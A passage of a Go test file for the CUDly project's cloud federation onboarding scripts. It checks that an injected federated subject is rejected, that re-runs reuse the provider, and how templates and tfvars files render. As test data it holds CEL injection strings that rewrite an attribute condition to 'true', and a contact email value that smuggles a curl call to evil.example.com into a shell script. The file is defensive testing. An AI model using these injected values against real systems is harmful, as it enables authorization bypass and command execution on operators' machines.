		})
	}

	// Positive control: an empty project must still be configured end to end.
	// Without it, a fix that refused every run would satisfy every case above.
	t.Run("accept/empty project", func(t *testing.T) {
		stateDir := t.TempDir()
		exitCode, stdout, stderr, calls := runGCPWIFScript(t, stateDir, nil)

		if exitCode != 0 {
			t.Fatalf("a fresh project must be configured successfully, got exit %d; stderr:\n%s", exitCode, stderr)
		}
		if len(calls) == 0 {
			t.Fatal("the gcloud stub was never invoked, so this case proves nothing")
		}
		created := callsContaining(calls, "providers create-oidc")
		if len(created) != 1 {
			t.Fatalf("expected exactly one provider create, got %d: %v", len(created), calls)
		}
		if !strings.Contains(created[0], "--attribute-condition="+gcpExpectedCondition) {
			t.Errorf("the provider must be created with the pinned condition %q, got:\n%s", gcpExpectedCondition, created[0])
		}
		if grants := callsContaining(calls, grantCall); len(grants) != 1 {
			t.Errorf("expected exactly one impersonation grant, got %d: %v", len(grants), calls)
		}
		if !strings.Contains(stdout, "=== Done ===") {
			t.Errorf("a successful run must report the values CUDly needs; stdout:\n%s", stdout)
		}
	})

	// The resumable case: a customer re-running the script over the state the
	// first run left behind. The second run must reuse the provider it created
	// rather than refuse it, so onboarding is not broken by the fix.
	t.Run("accept/re-run over the previous run's state", func(t *testing.T) {
		stateDir := t.TempDir()
		if exitCode, _, stderr, _ := runGCPWIFScript(t, stateDir, nil); exitCode != 0 {
			t.Fatalf("first run failed with exit %d; stderr:\n%s", exitCode, stderr)
		}

		exitCode, stdout, stderr, calls := runGCPWIFScript(t, stateDir, nil)
		if exitCode != 0 {
			t.Fatalf("re-running over an unchanged project must succeed, got exit %d; stderr:\n%s", exitCode, stderr)
		}
		if created := callsContaining(calls, "providers create-oidc"); len(created) != 0 {
			t.Errorf("the second run must not re-create the provider, got: %v", created)
		}
		if !strings.Contains(stdout, "Reusing existing provider") {
			t.Errorf("the second run must report the reuse; stdout:\n%s", stdout)
		}
		if grants := callsContaining(calls, grantCall); len(grants) != 1 {
			t.Errorf("the re-run must still (idempotently) apply the grant, got %d: %v", len(grants), calls)
		}
		if !strings.Contains(stdout, "=== Done ===") {
			t.Errorf("the re-run must complete; stdout:\n%s", stdout)
		}
	})
}

// TestGCPWIFCLI_SubjectValidated covers #1661 item 2: CUDLY_FEDERATED_SUBJECT is
// environment-overridable and lands inside the CEL string literal of
// --attribute-condition, so a value carrying a quote closes the literal and the
// remainder rewrites the condition: the value "x' || true || '" renders a
// condition whose second disjunct is a bare "true", admitting every subject the
// issuer will sign. It also lands in the principal:// identifier of the grant,
// where a '*' widens the member.
func TestGCPWIFCLI_SubjectValidated(t *testing.T) {
	reject := []struct {
		name    string
		subject string
	}{
		{"CEL break-out", `x' || true || '`},
		{"double quote", `x" || true || "`},
		{"backslash", `x\'`},
		{"backtick", "x`id`"},
		{"wildcard", "*"},
		{"embedded wildcard", "cudly-*"},
		{"unexpanded placeholder", "${CUDLY_SUBJECT}"},
		{"embedded space", "cudly controller"},
		{"leading punctuation", "-cudly-controller"},
		{"over the 127-character google.subject limit", strings.Repeat("a", 128)},
	}

	for _, tc := range reject {
		t.Run("reject/"+tc.name, func(t *testing.T) {
			stateDir := t.TempDir()
			exitCode, _, stderr, calls := runGCPWIFScript(t, stateDir,
				map[string]string{"CUDLY_FEDERATED_SUBJECT": tc.subject})

			if exitCode == 0 {
				t.Errorf("CUDLY_FEDERATED_SUBJECT %q was accepted (exit 0)", tc.subject)
			}
			// The guard must run before the first gcloud call, so a rejected run
			// leaves no pool, provider or grant behind.
			if len(calls) != 0 {
				t.Errorf("no gcloud call may be made before the subject is validated, got %d: %v", len(calls), calls)
			}
			if !strings.Contains(stderr, "CUDLY_FEDERATED_SUBJECT") {
				t.Errorf("stderr must name the rejected variable, got:\n%s", stderr)
			}
		})
	}

	// Positive controls: the default, and a subject in the Auth0/Okta shape the
	// charset deliberately admits. Without these, a guard rejecting everything
	// would pass every case above.
	accept := []struct {
		name    string
		subject string
		// wantPinned is the subject the provider must end up pinned to, which
		// differs from subject only where the script substitutes its default.
		wantPinned string
	}{
		{"default subject", "cudly-controller", "cudly-controller"},
		{"identity-provider-prefixed subject", "google-oauth2|1234567890", "google-oauth2|1234567890"},
		{"exactly 127 characters", strings.Repeat("a", 127), strings.Repeat("a", 127)},
		// An empty override is not a hole: ${VAR:-default} substitutes the
		// default for an empty value, so the provider is still pinned to
		// cudly-controller rather than to the empty subject.
		{"empty falls back to the default", "", "cudly-controller"},
	}
	for _, tc := range accept {
		t.Run("accept/"+tc.name, func(t *testing.T) {
			stateDir := t.TempDir()
			exitCode, stdout, stderr, calls := runGCPWIFScript(t, stateDir,
				map[string]string{"CUDLY_FEDERATED_SUBJECT": tc.subject})

			if exitCode != 0 {
				t.Fatalf("CUDLY_FEDERATED_SUBJECT %q was rejected (exit %d); stderr:\n%s", tc.subject, exitCode, stderr)
			}
			created := callsContaining(calls, "providers create-oidc")
			if len(created) != 1 {
				t.Fatalf("expected exactly one provider create, got %d: %v", len(created), calls)
			}
			if want := "--attribute-condition=assertion.sub == '" + tc.wantPinned + "'"; !strings.Contains(created[0], want) {
				t.Errorf("the provider must be pinned to the supplied subject with %q, got:\n%s", want, created[0])
			}
			if !strings.Contains(stdout, "=== Done ===") {
				t.Errorf("a valid subject must configure the project end to end; stdout:\n%s", stdout)
			}
		})
	}
}

// TestCLITemplatesShellMetacharsPassThrough confirms that text/template does
// not shell-escape interpolated values. This is intentional: the templates are
// designed to be downloaded and inspected by an operator, not auto-executed.
// The renderer (handler_federation.go) is responsible for validating fields
// before execution so that user-controlled values cannot inject shell commands.
func TestCLITemplatesShellMetacharsPassThrough(t *testing.T) {
	// Craft a ContactEmail that contains shell metacharacters. If the template
	// engine were to shell-escape this, the output would differ from the input.
	data := baseData()
	data.ContactEmail = `ops@example.com"; curl https://evil.example.com; echo "`

	rendered := renderCLITemplate(t, "templates/aws-cross-account-cli.sh.tmpl", data)

	// The raw metacharacter string must appear verbatim in the rendered output,
	// confirming that text/template does NOT escape it. The test documents the
	// invariant that the renderer MUST validate ContactEmail (and similar fields)
	// before calling template.Execute.
	if !strings.Contains(rendered, data.ContactEmail) {
		t.Errorf("expected raw ContactEmail (including metacharacters) to appear verbatim in rendered template; renderer must validate this field before execution")
	}
}

// TestGCPWIFTfvarsMarksPinnedIdentityRequired proves the generated tfvars file
// presents aws_role_name / oidc_subject as a blank the operator must fill, not
// as an optional hardening step. iac/federation/gcp-target/terraform pins both
// the provider's attribute condition and the impersonation grant to that value
// and refuses to apply without it, so "Recommended" understated it: a bundle
// following the old wording could not apply at all.
func TestGCPWIFTfvarsMarksPinnedIdentityRequired(t *testing.T) {
	const path = "templates/gcp-wif.tfvars.tmpl"

	awsData := baseData()
	awsData.Source = "aws"
	aws := renderCLITemplate(t, path, awsData)

	azureData := baseData()
	azureData.Source = "azure"
	azure := renderCLITemplate(t, path, azureData)

	cases := []struct {
		name     string
		rendered string
		assign   string
	}{
		{"aws", aws, "aws_role_name = \"\""},
		{"azure", azure, "oidc_subject = \"\""},
	}
	for _, tc := range cases {
		if strings.Contains(tc.rendered, "Recommended") {
			t.Errorf("%s (%s): pinning the trusted identity is required, not recommended; terraform apply fails without it", path, tc.name)
		}
		if !strings.Contains(tc.rendered, "REQUIRED") {
			t.Errorf("%s (%s): expected the pinned-identity variable to be labeled REQUIRED", path, tc.name)
		}
		// Emitted uncommented so the blank is visible in the file the customer
		// edits; a commented-out line reads as an option that was left off.
		if !strings.Contains(tc.rendered, "\n"+tc.assign) {
			t.Errorf("%s (%s): expected an uncommented %q line for the operator to fill", path, tc.name, tc.assign)
		}
	}

	// The AWS branch names the account the role must live in, so the operator
	// knows which account's role to pin.
	if !strings.Contains(aws, awsData.SourceAccountID) {
		t.Errorf("%s (aws): expected the source AWS account ID %q in the aws_role_name guidance", path, awsData.SourceAccountID)
	}
}

// TestCLITemplatesOmitRegisterBlock proves the auto-register section is gated
// on CUDlyAPIURL -- when it's empty, the block disappears entirely.
func TestCLITemplatesOmitRegisterBlock(t *testing.T) {
	data := baseData()
	data.CUDlyAPIURL = ""

	paths := []string{
		"templates/aws-cross-account-cli.sh.tmpl",
		"templates/aws-wif-cli.sh.tmpl",
		"templates/azure-wif-cli.sh.tmpl",
		"templates/gcp-wif-cli.sh.tmpl",
		"templates/gcp-sa-impersonation-cli.sh.tmpl",
	}
	for _, p := range paths {
		rendered := renderCLITemplate(t, p, data)
		if strings.Contains(rendered, "/api/register") {
			t.Errorf("%s: auto-register block should be gone when CUDlyAPIURL is empty", p)
		}
	}
}
